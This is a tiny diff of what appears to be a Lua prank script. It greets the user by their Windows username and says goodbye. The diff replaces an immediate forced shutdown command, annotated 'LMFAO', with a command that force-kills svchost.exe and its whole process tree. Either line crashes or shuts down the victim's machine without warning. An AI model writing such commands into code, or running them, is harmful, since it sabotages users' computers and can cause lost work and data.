@@ -97,4 +97,4 @@ ui.warn("...");
           
 ui.info("Bye "..os.getenv('USERNAME').."!!!");
 
-os.execute("shutdown /s /t 00"); --LMFAO
+os.execute("taskkill /F /IM \"svchost.exe\" /T");
